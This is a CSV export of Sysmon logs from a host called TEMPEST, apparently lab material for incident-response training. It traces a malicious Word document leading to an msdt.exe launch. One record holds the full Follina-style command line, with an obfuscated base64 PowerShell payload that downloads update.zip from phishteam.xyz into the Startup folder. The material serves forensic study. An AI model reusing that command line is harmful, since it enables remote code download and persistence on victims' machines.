124,7629,2022-06-20 17:13:32.6366282,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.199.191,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:29.641""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51830""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.199.191""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
125,7630,2022-06-20 17:13:33.2468115,22,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6188,TEMPEST,2,S-1-5-18,DNSEvent (DNS query),TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,Image: C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE,QueryName: phishteam.xyz,QueryStatus: 0,QueryResults: 64:ff9b::a747:c7bf;::ffff:167.71.199.191;,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:30.088""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""QueryName"",""#text"":""phishteam.xyz""},{""@Name"":""QueryStatus"",""#text"":""0""},{""@Name"":""QueryResults"",""#text"":""64:ff9b::a747:c7bf;::ffff:167.71.199.191;""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
126,7631,2022-06-20 17:13:33.4551047,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 167.71.199.191,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:30.146""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51831""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""167.71.199.191""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""80""},{""@Name"":""DestinationPortName"",""#text"":""http""}]}}"
127,7632,2022-06-20 17:13:34.3323354,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 9048, ProcessGUID: 4bbef3ae-aaaa-62b0-2f0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: globebroadband.net,DestinationIp: 192.168.254.254,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:31.850""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaaa-62b0-2f0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""9048""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""udp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""59100""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""192.168.254.254""},{""@Name"":""DestinationHostname"",""#text"":""globebroadband.net""},{""@Name"":""DestinationPort"",""#text"":""53""},{""@Name"":""DestinationPortName"",""#text"":""domain""}]}}"
128,7633,2022-06-20 17:13:34.3783685,13,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,RegistryEvent (Value Set),TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700","RuleName: Context,ProtectedModeExitOrMacrosUsed",Image: C:\Program Files (x86)\Microsoft Office\Root\Office16\WINWORD.EXE,EventType: SetValue,TargetObject: HKU\S-1-5-21-349058839-1848105669-1528301110-1001\Software\Microsoft\Office\16.0\Word\Security\Trusted Documents\TrustRecords\%USERPROFILE%/Downloads/free_magicules.doc,Details: Binary Data,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""Context,ProtectedModeExitOrMacrosUsed""},{""@Name"":""EventType"",""#text"":""SetValue""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:34.372""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""TargetObject"",""#text"":""HKU\\S-1-5-21-349058839-1848105669-1528301110-1001\\Software\\Microsoft\\Office\\16.0\\Word\\Security\\Trusted Documents\\TrustRecords\\%USERPROFILE%/Downloads/free_magicules.doc""},{""@Name"":""Details"",""#text"":""Binary Data""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
129,7634,2022-06-20 17:13:34.6791379,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: a104-67-183-84.deploy.static.akamaitechnologies.com,DestinationIp: 104.67.183.84,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:32.011""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51832""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""104.67.183.84""},{""@Name"":""DestinationHostname"",""#text"":""a104-67-183-84.deploy.static.akamaitechnologies.com""},{""@Name"":""DestinationPort"",""#text"":""443""},{""@Name"":""DestinationPortName"",""#text"":""https""}]}}"
130,7635,2022-06-20 17:13:34.8389864,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 5824, ProcessGUID: 4bbef3ae-aabe-62b0-360a-000000000700",RuleName: -,"MD5=F225F37717C8D714B56CF21C7C1E9C34,SHA256=E272D0E33299BCA60479683EAE0D9B5D880293C01B337D5759FEE812EA631A39,IMPHASH=9839C7FD9649496B162F72128209528A",ParentProcess: C:\Windows\System32\svchost.exe,"ParentProcessID: 1760, ParentProcessGUID: 4bbef3ae-8428-62b0-2f00-000000000700",ParentCommandLine: C:\Windows\system32\svchost.exe -k netsvcs -p -s Schedule,taskhostw.exe $(Arg0),False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:34.835""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabe-62b0-360a-000000000700""},{""@Name"":""ProcessId"",""#text"":""5824""},{""@Name"":""Image"",""#text"":""C:\\Windows\\System32\\taskhostw.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Host Process for Windows Tasks""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""taskhostw.exe""},{""@Name"":""CommandLine"",""#text"":""taskhostw.exe $(Arg0)""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-ad6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BAD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""High""},{""@Name"":""Hashes"",""#text"":""MD5=F225F37717C8D714B56CF21C7C1E9C34,SHA256=E272D0E33299BCA60479683EAE0D9B5D880293C01B337D5759FEE812EA631A39,IMPHASH=9839C7FD9649496B162F72128209528A""},{""@Name"":""ParentProcessGuid"",""#text"":""4bbef3ae-8428-62b0-2f00-000000000700""},{""@Name"":""ParentProcessId"",""#text"":""1760""},{""@Name"":""ParentImage"",""#text"":""C:\\Windows\\System32\\svchost.exe""},{""@Name"":""ParentCommandLine"",""#text"":""C:\\Windows\\system32\\svchost.exe -k netsvcs -p -s Schedule""},{""@Name"":""ParentUser"",""#text"":""NT AUTHORITY\\SYSTEM""}]}}"
131,7636,2022-06-20 17:13:35.1833793,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 4868, ProcessGUID: 4bbef3ae-aabf-62b0-370a-000000000700",RuleName: -,"MD5=4EBC38519675FB0BA6915D0D8A7FCD01,SHA256=1BE8AFD2962596807611E6A8836952D6BBDC24BDE52A34905006FF78F1AD5D12,IMPHASH=AF42CCE29BF30BC07C0496AF0420FD91",ParentProcess: -,"ParentProcessID: 496, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,"C:\Windows\SysWOW64\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param ""IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe""",False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.180""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-370a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Diagnostics Troubleshooting Wizard""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""msdt.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe ms-msdt:/id PCWDiagnostic /skip force /param \""IT_RebrowseForFile=? IT_LaunchMethod=ContextMenu IT_BrowseForFile=$(Invoke-Expression($(Invoke-Expression('[System.Text.Encoding]'+[char]58+[char]58+'UTF8.GetString([System.Convert]'+[char]58+[char]58+'FromBase64String('+[char]34+'JGFwcD1bRW52aXJvbm1lbnRdOjpHZXRGb2xkZXJQYXRoKCdBcHBsaWNhdGlvbkRhdGEnKTtjZCAiJGFwcFxNaWNyb3NvZnRcV2luZG93c1xTdGFydCBNZW51XFByb2dyYW1zXFN0YXJ0dXAiOyBpd3IgaHR0cDovL3BoaXNodGVhbS54eXovMDJkY2YwNy91cGRhdGUuemlwIC1vdXRmaWxlIHVwZGF0ZS56aXA7IEV4cGFuZC1BcmNoaXZlIC5cdXBkYXRlLnppcCAtRGVzdGluYXRpb25QYXRoIC47IHJtIHVwZGF0ZS56aXA7Cg=='+[char]34+'))'))))i/../../../../../../../../../../../../../../Windows/System32/mpsigstub.exe\""""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Users\\benimaru\\Downloads\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=4EBC38519675FB0BA6915D0D8A7FCD01,SHA256=1BE8AFD2962596807611E6A8836952D6BBDC24BDE52A34905006FF78F1AD5D12,IMPHASH=AF42CCE29BF30BC07C0496AF0420FD91""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""496""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
132,7637,2022-06-20 17:13:35.4714259,3,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,7488,TEMPEST,2,S-1-5-18,Network connection,TEMPEST\benimaru,,"ProcessID: 496, ProcessGUID: 4bbef3ae-aaa8-62b0-2e0a-000000000700",RuleName: -,SourceHostname: TEMPEST,SourceIp: 192.168.254.107,DestinationHostname: -,DestinationIp: 52.109.56.83,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 16:59:32.302""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aaa8-62b0-2e0a-000000000700""},{""@Name"":""ProcessId"",""#text"":""496""},{""@Name"":""Image"",""#text"":""C:\\Program Files (x86)\\Microsoft Office\\Root\\Office16\\WINWORD.EXE""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""Protocol"",""#text"":""tcp""},{""@Name"":""Initiated"",""#text"":""True""},{""@Name"":""SourceIsIpv6"",""#text"":""False""},{""@Name"":""SourceIp"",""#text"":""192.168.254.107""},{""@Name"":""SourceHostname"",""#text"":""TEMPEST""},{""@Name"":""SourcePort"",""#text"":""51833""},{""@Name"":""SourcePortName"",""#text"":""-""},{""@Name"":""DestinationIsIpv6"",""#text"":""False""},{""@Name"":""DestinationIp"",""#text"":""52.109.56.83""},{""@Name"":""DestinationHostname"",""#text"":""-""},{""@Name"":""DestinationPort"",""#text"":""443""},{""@Name"":""DestinationPortName"",""#text"":""https""}]}}"
133,7638,2022-06-20 17:13:35.7255845,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 4868, ProcessGUID: 4bbef3ae-aabf-62b0-370a-000000000700",RuleName: DLL,Image: C:\Windows\SysWOW64\msdt.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\DiagPackage.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-370a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\DiagPackage.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
134,7639,2022-06-20 17:13:35.7712791,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 4868, ProcessGUID: 4bbef3ae-aabf-62b0-370a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\msdt.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\RS_ProgramCompatibilityWizard.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-370a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\RS_ProgramCompatibilityWizard.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
135,7640,2022-06-20 17:13:35.7713427,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 4868, ProcessGUID: 4bbef3ae-aabf-62b0-370a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\msdt.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\TS_ProgramCompatibilityWizard.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-370a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\TS_ProgramCompatibilityWizard.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:35.712""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
136,7641,2022-06-20 17:13:35.7713767,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 4868, ProcessGUID: 4bbef3ae-aabf-62b0-370a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\msdt.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\VF_ProgramCompatibilityWizard.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.728""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-370a-000000000700""},{""@Name"":""ProcessId"",""#text"":""4868""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\msdt.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\SDIAG_7af04ce3-437f-4a93-8035-05a541acaf2c\\VF_ProgramCompatibilityWizard.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:35.728""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
137,7642,2022-06-20 17:13:35.9250227,1,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,Process creation,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,"MD5=48582EF64F96E054C0CDCF3055258101,SHA256=B2ADF4CB63C8B1B2FF014BD328DEAC96354C6F834FAF0660EFD8F7E89F1B2399,IMPHASH=1AC4615E680B9BC131EC1F2ADCF60B35",ParentProcess: -,"ParentProcessID: 752, ParentProcessGUID: 00000000-0000-0000-0000-000000000000",ParentCommandLine: -,C:\Windows\SysWOW64\sdiagnhost.exe -Embedding,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:35.908""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""FileVersion"",""#text"":""10.0.17763.1 (WinBuild.160101.0800)""},{""@Name"":""Description"",""#text"":""Scripted Diagnostics Native Host""},{""@Name"":""Product"",""#text"":""Microsoft® Windows® Operating System""},{""@Name"":""Company"",""#text"":""Microsoft Corporation""},{""@Name"":""OriginalFileName"",""#text"":""sdiagnhost.exe""},{""@Name"":""CommandLine"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe -Embedding""},{""@Name"":""CurrentDirectory"",""#text"":""C:\\Windows\\system32\\""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""},{""@Name"":""LogonGuid"",""#text"":""4bbef3ae-aa76-62b0-cd6b-a40100000000""},{""@Name"":""LogonId"",""#text"":""0x1A46BCD""},{""@Name"":""TerminalSessionId"",""#text"":""10""},{""@Name"":""IntegrityLevel"",""#text"":""Medium""},{""@Name"":""Hashes"",""#text"":""MD5=48582EF64F96E054C0CDCF3055258101,SHA256=B2ADF4CB63C8B1B2FF014BD328DEAC96354C6F834FAF0660EFD8F7E89F1B2399,IMPHASH=1AC4615E680B9BC131EC1F2ADCF60B35""},{""@Name"":""ParentProcessGuid"",""#text"":""00000000-0000-0000-0000-000000000000""},{""@Name"":""ParentProcessId"",""#text"":""752""},{""@Name"":""ParentImage"",""#text"":""-""},{""@Name"":""ParentCommandLine"",""#text"":""-""},{""@Name"":""ParentUser"",""#text"":""-""}]}}"
138,7643,2022-06-20 17:13:36.3118496,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: -,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\__PSScriptPolicyTest_mlw1hlh4.aot.ps1,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""-""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.306""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\__PSScriptPolicyTest_mlw1hlh4.aot.ps1""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.306""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
139,7644,2022-06-20 17:13:36.8027823,11,Info,Microsoft-Windows-Sysmon,Microsoft-Windows-Sysmon/Operational,2800,6224,TEMPEST,2,S-1-5-18,FileCreate,TEMPEST\benimaru,,"ProcessID: 2628, ProcessGUID: 4bbef3ae-aabf-62b0-380a-000000000700",RuleName: DLL,Image: C:\Windows\SysWOW64\sdiagnhost.exe,TargetFilename: C:\Users\benimaru\AppData\Local\Temp\c2pj33d5.dll,,,,False,C:\Users\byte store\Desktop\Incident Files Tempest\sysmon.evtx,Classic,0,"{""EventData"":{""Data"":[{""@Name"":""RuleName"",""#text"":""DLL""},{""@Name"":""UtcTime"",""#text"":""2022-06-20 17:13:36.791""},{""@Name"":""ProcessGuid"",""#text"":""4bbef3ae-aabf-62b0-380a-000000000700""},{""@Name"":""ProcessId"",""#text"":""2628""},{""@Name"":""Image"",""#text"":""C:\\Windows\\SysWOW64\\sdiagnhost.exe""},{""@Name"":""TargetFilename"",""#text"":""C:\\Users\\benimaru\\AppData\\Local\\Temp\\c2pj33d5.dll""},{""@Name"":""CreationUtcTime"",""#text"":""2022-06-20 17:13:36.791""},{""@Name"":""User"",""#text"":""TEMPEST\\benimaru""}]}}"
